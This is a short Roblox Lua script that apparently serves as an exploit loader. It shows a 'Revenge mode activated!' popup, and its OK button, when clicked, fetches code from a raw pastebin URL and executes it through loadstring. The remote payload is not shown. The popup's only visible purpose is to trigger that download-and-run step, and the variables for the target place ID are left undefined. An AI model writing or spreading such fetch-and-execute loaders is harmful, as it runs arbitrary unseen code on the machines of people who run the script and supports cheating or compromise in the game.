local message = "Revenge mode activated!"
 
if placeId == targetPlaceId then
    local player = game.Players.LocalPlayer
 
    local popup = Instance.new("ScreenGui")
    popup.Name = "RevengePopup"
    popup.Parent = player.PlayerGui
 
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0.3, 0, 0.2, 0)
    frame.Position = UDim2.new(0.5, -frame.Size.X.Offset / 2, 0.5, -frame.Size.Y.Offset / 2)
    frame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
    frame.BorderSizePixel = 0
    frame.Parent = popup
 
    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.8, 0)
    label.Position = UDim2.new(0, 0, 0.1, 0)
    label.BackgroundTransparency = 1
    label.TextColor3 = Color3.new(1, 1, 1)
    label.Font = Enum.Font.SourceSansBold
    label.TextSize = 20
    label.Text = message
    label.Parent = frame
 
    local okButton = Instance.new("TextButton")
    okButton.Size = UDim2.new(0.4, 0, 0.2, 0)
    okButton.Position = UDim2.new(0.3, 0, 0.7, 0)
    okButton.BackgroundColor3 = Color3.new(0.5, 0.5, 1)
    okButton.TextColor3 = Color3.new(1, 1, 1)
    okButton.Font = Enum.Font.SourceSansBold
    okButton.TextSize = 18
    okButton.Text = "OK"
    okButton.Parent = frame
 
    okButton.MouseButton1Click:Connect(function()
        popup:Destroy()
        loadstring(game:HttpGet('https://pastebin.com/raw/cJWSByci'))()
    end)
end